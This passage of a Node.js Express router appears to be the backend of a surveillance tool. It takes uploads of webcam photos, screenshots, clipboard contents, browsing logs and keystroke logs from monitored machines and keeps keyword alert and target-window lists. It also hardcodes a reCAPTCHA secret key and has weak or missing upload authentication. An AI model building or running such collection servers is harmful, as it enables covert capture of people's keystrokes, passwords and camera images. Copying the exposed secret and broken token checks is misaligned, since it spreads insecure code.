            if (err) console.log(err);
            settings.email = email
            modelFTP.findOne({ name: 'ftp', user: req.body.user }, function (err, ftp) {
                if (err) console.log(err);
                settings.ftp = ftp;
                modelGeneral.findOne({ name: 'general', user: req.body.user }, function (err, general) {
                    if (err) console.log(err);
                    settings.general = general;
                    modelKeywordAlert.findOne({ name: 'keywordAlert', user: req.body.user }, function (err, keywordAlert) {
                        if (err) console.log(err);
                        settings.keywordAlert = keywordAlert;
                        modelKeywordTarget.findOne({ name: 'keywordTarget', user: req.body.user }, function (err, keywordTarget) {
                            if (err) console.log(err);
                            settings.keywordTarget = keywordTarget;
                            modelScreenshot.findOne({ name: 'screenshot', user: req.body.user }, function (err, screenshot) {
                                if (err) console.log(err);
                                settings.screenshot = screenshot;
                                modelTarget.findOne({ name: 'target', user: req.body.user }, function (err, target) {
                                    if (err) console.log(err);
                                    settings.target = target;
                                    modelWebcam.findOne({ name: 'webcam', user: req.body.user }, function (err, webcam) {
                                        if (err) console.log(err);
                                        settings.webcam = webcam;
                                        modelWeb.findOne({ name: 'web', user: req.body.user }, function (err, web) {
                                            if (err) console.log(err);
                                            settings.web = web;
                                            modelKeywordUser.findOne({ name: 'keywordUser', user: req.body.user }, function (err, keywordUser) {
                                                if (err) console.log(err);
                                                settings.keywordUser = keywordUser;
						modelUser.findOne({ name: 'user', user: req.body.user }, function (err, user) {
							if (err) console.log(err);
							settings.user = user;
                                                	res.send(settings);
						})
                                            })
                                        })
                                    })
                                })
                            })
                        })
                    })
                })
            })
        })
    })
})

function checkToken(req, res, next) {
    new ExifImage({ image: req.files[0].path }, function (error, exifData) {
        if (error)
            console.log('Error: ' + error.message);
        else {
            var token = exifData.image.Artist;
            modelLogin.findById(token, function (err, user) {
                if (user === null) {
                    fs.unlinkSync(req.files[0].path);
                    return res.send('User not found');
                }
		if (req.files[0].size === 0) {
                    	fs.unlinkSync(req.files[0].path);
			return res.send('Size file must be larger than 0Kb');
		}
            })
            return next();
        }
    });
}

router.post('/upload-webcam', uploadWebcam.array('file'), checkToken, function (req, res, next) {
    var filename = req.files[0].originalname;
    var datetime = filename.split('-');
    var user = datetime[2];
    user = user.split('.jpeg')[0];
    var date = datetime[0].split('_');
    var time = (datetime[1].split('.'))[0].split('_');
    date = date[0] + '-' + date[1] + '-' + date[2];
    time = time[0] + ':' + time[1];
    var path = (req.files[0].path);
    path = path.replace("public/", '')
    modelFindWebcam.findOne({ date: date, user: user }, (err, item) => {
        if (err) console.log(err);
        if (item === null) {
            var data = new modelFindWebcam({
                date: date,
                user: user,
                time: [{
                    time: time,
                    path: path
                }],
            })
            data.save(err => {
                if (err) console.log(err);
            })
        } else {
            var data = {
                time: time,
                path: path,
                user: user
            }
            modelFindWebcam.findOneAndUpdate({ date: date, user: user }, { $push: { time: data } }, err => {
                if (err) console.log(err);
            })
        }
    	res.end();
    })
})


router.post('/upload-screenshot', uploadScreenshot.array('file'), function (req, res, next) {
    var filename = req.files[0].originalname;
    var datetime = filename.split('-');
    var user = datetime[2];
    user = user.split('.jpeg')[0];
    var date = datetime[0].split('_');
    var time = (datetime[1].split('.'))[0].split('_');
    date = date[0] + '-' + date[1] + '-' + date[2];
    var path = (req.files[0].path);
    path = path.replace("public/", '')
    modelFindScreenshot.findOne({ date: date, user: user }, (err, item) => {
        if (err) console.log(err);
        if (item === null) {
            var data = new modelFindScreenshot({
                date: date,
                user: user,
                time: [{
                    time: time,
                    path: path
                }],
            })
	console.log(item);
            data.save(err => {
                if (err) console.log(err);
            })
        } else {
            var data = {
                time: time,
                path: path,
                user: user
            }
	console.log(data);
            modelFindScreenshot.findOneAndUpdate({ date: date, user: user }, { $push: { time: data } }, err => {
                if (err) console.log(err);
            })
        }
    	res.end()
    })
})

router.post('/upload-clipboard-image', uploadClipboardImage.array('file'), checkToken, function (req, res, next) {
    var filename = req.files[0].originalname;
    var datetime = filename.split('-');
    var user = datetime[2];
    user = user.split('.jpeg')[0];
    var date = datetime[0].split('_');
    var time = (datetime[1].split('.'))[0].split('_');
    date = date[0] + '-' + date[1] + '-' + date[2];
    time = time[0] + ':' + time[1];
    var path = (req.files[0].path);
    path = path.replace("public/", '')
    modelFindClipboardImage.findOne({ date: date, user: user }, (err, item) => {
        if (err) console.log(err);
        if (item === null) {
            var data = new modelFindClipboardImage({
                date: date,
                user: user,
                time: [{
                    time: time,
                    path: '' + path
                }],
            })
            data.save(err => {
                if (err) console.log(err);
            })
        } else {
            var data = {
                time: time,
                path: path,
                user: user
            }
            modelFindClipboardImage.findOneAndUpdate({ date: date, user: user }, { $push: { time: data } }, err => {
                if (err) console.log(err);
            })
        }
    	res.end();
    })
})

router.post('/upload-clipboard-log', uploadClipboardLog.array('file'), function (req, res, next) {
    var filename = req.files[0].originalname;
    var dateExtension = filename.split('.txt');
    var dateUser = dateExtension[0].split('-');
    var user = dateUser[1];
    var token = dateUser[2];
    modelLogin.findById(token, function (err, user) {
        if (req.files[0].size === 0) {
            fs.unlinkSync(req.files[0].path);
            res.send('Size file must be larger than 0Kb');
        } else {
            if (user !== null && user !== undefined) {
                var date = dateUser[0].split('_');
                date = date[0] + '-' + date[1] + '-' + date[2];
                var path = req.files[0].path;
                path = path.replace("public/", '')
                modelFindClipboardLog.findOne({ time: date, user: user.local.email }, { upsert: true }, (err, item) => {
                    if (err) console.log(err);
                    if (item === null) {
                        var data = new modelFindClipboardLog({
                            user: user.local.email,
                            time: date,
                            color: '#555',
                            css: 'success',
                            content: path
                        })
                        data.save(err => {
                            if (err) console.log(err);
                        })
                    }
                })
                res.end();

            } else {
                fs.unlinkSync(req.files[0].path);
                res.send('User not found');
            }
        }
    })
})

router.post('/upload-web-log', uploadWebLog.array('file'), function (req, res, next) {
    var filename = req.files[0].originalname;
    var extension = getFileExtension(filename);
    var dateExtension = filename.split('.' + extension);
    var dateUser = dateExtension[0].split('-');
    var user = dateUser[1];
    var nameType = dateUser[2];
    var token = dateUser[3];
    modelLogin.findById(token, function (err, user) {
        if (req.files[0].size === 0) {
            fs.unlinkSync(req.files[0].path);
            res.send('Size file must be larger than 0Kb');
        } else {
            if (user !== null && user !== undefined) {
                var date = dateUser[0].split('_');
                date = date[0] + '-' + date[1] + '-' + date[2];
                var path = req.files[0].path;
                path = path.replace("public/", '')
                modelFindWebLog.findOneAndUpdate({ time: date, user: user.local.email, name: nameType }, { upsert: true }, (err, item) => {
                    if (err) console.log(err);
                    if (item === null) {
                        var data = new modelFindWebLog({
                            user: user.local.email,
                            time: date,
                            color: '#555',
                            css: 'success',
                            content: path,
                            name: nameType
                        })
                        data.save(err => {
                            if (err) console.log(err);
                        })
                    }
                })
                res.end();
            } else {
                fs.unlinkSync(req.files[0].path);
                res.send('User not found');
            }
        }
    })
})

router.post('/upload-keystroke', uploadKeystroke.array('file'), function (req, res, next) {
    var filename = req.files[0].originalname;
    var dateExtension = filename.split('.txt');
    var dateUser = dateExtension[0].split('-');
    var user = dateUser[1];
    var token = dateUser[2];
    modelLogin.findById(token, function (err, user) {
        if (req.files[0].size === 0) {
            fs.unlinkSync(req.files[0].path);
            res.send('Size file must be larger than 0Kb');
        } else {
            if (user !== null && user !== undefined) {
                var date = dateUser[0].split('_');
                date = date[0] + '-' + date[1] + '-' + date[2];
                var path = req.files[0].path;
                path = path.replace("public/", '')
                modelFindKeystroke.findOneAndUpdate({ time: date, user: user.local.email }, { upsert: true }, (err, item) => {
                    if (err) console.log(err);
                    if (item === null) {
                        var data = new modelFindKeystroke({
                            user: user.local.email,
                            time: date,
                            color: '#555',
                            css: 'success',
                            content: path
                        })
                        data.save(err => {
                            if (err) console.log(err);
                        })
                    }
                })
                res.end();

            } else {
                fs.unlinkSync(req.files[0].path);
                res.send('User not found');
            }
        }
    })
})

router.post('/change-avatar', isLoggedIn, uploadAvatar.single('file'), function (req, res, next) {
    res.end();
})

router.get('/properties', function (req, res, next) {
    res.render('properties');
})

router.post('/add-alert', isLoggedIn, function (req, res, next) {
    var keywordAlert = req.body.keywordAlert;
    modelKeywordAlert.findOne({ name: 'keywordAlert', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        var list = [];
        if (data !== null)
            list = [...data.list];
        list.push(keywordAlert);
        var alert = {
            name: 'keywordAlert',
            list: list,
            user: req.session.user
        }
        modelKeywordAlert.findOneAndUpdate({ name: 'keywordAlert', user: req.session.user }, alert, { upsert: true }, err => {
            if (err) console.log(err);
            gMessageAdd = 'Added successfully'
            res.redirect('/alert');
        })
    })
})

router.get('/delete-alert/:keyword', isLoggedIn, function (req, res, next) {
    var keyword = req.params.keyword;
    modelKeywordAlert.findOne({ name: 'keywordAlert', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        var list = [...data.list];
        list.forEach((element, index) => {
            if (element === keyword) {
                list.splice(index, 1);
            }
        });
        var alert = {
            name: 'keywordAlert',
            list: list
        }
        modelKeywordAlert.findOneAndUpdate({ name: 'keywordAlert', user: req.session.user }, alert, { upsert: true }, err => {
            if (err) console.log(err);
            gMessageDel = 'Deleted successfully'
            res.redirect('/alert')
        })
    })
})

router.post('/add-user', isLoggedIn, function (req, res, next) {
    var keywordUser = req.body.keywordUser;
    modelKeywordUser.findOne({ name: 'keywordUser', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        var list = [];
        if (data !== null)
            list = [...data.list];
        list.push(keywordUser);
        var user = {
            name: 'keywordUser',
            list: list,
            user: req.session.user
        }
        modelKeywordUser.findOneAndUpdate({ name: 'keywordUser', user: req.session.user }, user, { upsert: true }, err => {
            if (err) console.log(err);
            gMessageAdd = 'Added successfully'
            res.redirect('/user');
        })
    })
})

router.get('/delete-user/:keyword', isLoggedIn, function (req, res, next) {
    var keyword = req.params.keyword;
    modelKeywordUser.findOne({ name: 'keywordUser', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        var list = [...data.list];
        list.forEach((element, index) => {
            if (element === keyword) {
                list.splice(index, 1);
            }
        });
        var user = {
            name: 'keywordUser',
            list: list
        }
        modelKeywordUser.findOneAndUpdate({ name: 'keywordUser', user: req.session.user }, user, { upsert: true }, err => {
            if (err) console.log(err);
            gMessageDel = 'Deleted successfully'
            res.redirect('/user')
        })
    })
})

router.post('/add-target', isLoggedIn, function (req, res, next) {
    var keyword = req.body.keywordTarget;
    var option = req.body.option;
    modelKeywordTarget.findOne({ name: 'keywordTarget', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        var application = [];
        var title = [];
        if (data !== null) {
            application = [...data.application];
            title = [...data.title];
        }

        if (option === 'Windows Title')
            title.push(keyword);
        else
            application.push(keyword);
        var target = {
            name: 'keywordTarget',
            user: req.session.user,
            application: application,
            title: title,
        }
        modelKeywordTarget.findOneAndUpdate({ name: 'keywordTarget', user: req.session.user }, target, { upsert: true }, err => {
            if (err) console.log(err);
            gMessageAdd = 'Added successfully'
            res.redirect('/target');
        })
    })
})

router.get('/delete-target/:keyword', isLoggedIn, function (req, res, next) {
    var keyword = req.params.keyword;
    modelKeywordTarget.findOne({ name: 'keywordTarget' }, function (err, data) {
        if (err) console.log(err);
        var application = [...data.application];
        var title = [...data.title];
        application.forEach((element, index) => {
            if (element === keyword)
                application.splice(index, 1);
        })
        title.forEach((element, index) => {
            if (element === keyword)
                title.splice(index, 1);
        })
        var target = {
            name: 'keywordTarget',
            application: application,
            title: title,
            user: req.session.user,
        }
        modelKeywordTarget.findOneAndUpdate({ name: 'keywordTarget', user: req.session.user }, target, { upsert: true }, err => {
            if (err) console.log(err);
            gMessageDel = 'Deleted successfully'
            res.redirect('/target');
        })
    })
})

router.post('/delete-all-target', isLoggedIn, function (req, res, next) {
    var application = [];
    var title = [];
    var target = {
        name: 'keywordTarget',
        user: req.session.user,
        application: application,
        title: title,
    }
    modelKeywordTarget.findOneAndUpdate({ name: 'keywordTarget', user: req.session.user }, target, { upsert: true }, err => {
        if (err) console.log(err);
        gMessageDel = 'Deleted successfully'
        res.redirect('/target');
    })
})

router.post('/delete-all-alert', isLoggedIn, function (req, res, next) {
    var alert = {
        name: 'keywordAlert',
        user: req.session.user,
        list: []
    }
    modelKeywordAlert.findOneAndUpdate({ name: 'keywordAlert', user: req.session.user }, alert, { upsert: true }, err => {
        if (err) console.log(err);
        gMessageDel = 'Deleted successfully'
        res.redirect('/alert');
    })
})

router.post('/delete-all-user', isLoggedIn, function (req, res, next) {
    var user = {
        name: 'keywordUser',
        user: req.session.user,
        list: []
    }
    modelKeywordUser.findOneAndUpdate({ name: 'keywordUser', user: req.session.user }, user, { upsert: true }, err => {
        if (err) console.log(err);
        gMessageDel = 'Deleted successfully'
        res.redirect('/alert');
    })
})

function isLogginUpload(req, res, next) {
    passport.authenticate('local-login', function (err, user, info) {
        if (err) { return; }
        if (!user) { return res.send('Error'); }

        req.logIn(user, function (err) {
            if (err) { res.send('User not found'); }
            res.send(user._id);
            return next();
        });

    })(req, res, next);
}

function isSignupUpload(req, res, next) {
    passport.authenticate('local-signup', function (err, user, info) {
        if (err) { return; }
        if (!user) { return res.send('Duplicate email'); }
        else {
            res.send(user._id);
            return next();
        }
    })(req, res, next);
}


function isLoggedIn(req, res, next) {
    if (req.isAuthenticated())
        return next();
    res.redirect('/');
}

function captchaVerification(req, res, next) {
    if (req.body['g-recaptcha-response'] === undefined || req.body['g-recaptcha-response'] === '' || req.body['g-recaptcha-response'] === null) {
        return res.redirect('/');
    }

    var secretKey = "6Le_02EUAAAAAPv_rUp8H0wssyxneVHl9Cw29XEK";
    var verificationUrl = "https://www.google.com/recaptcha/api/siteverify?secret=" + secretKey + "&response=" + req.body['g-recaptcha-response'] + "&remoteip=" + req.connection.remoteAddress;
    request(verificationUrl, function (error, response, body) {
        body = JSON.parse(body);
        if (body.success !== undefined && !body.success) {
            return res.json({ "responseCode": 1, "responseDesc": "Failed captcha verification" });
        }
    });
    return next()
}


module.exports = router;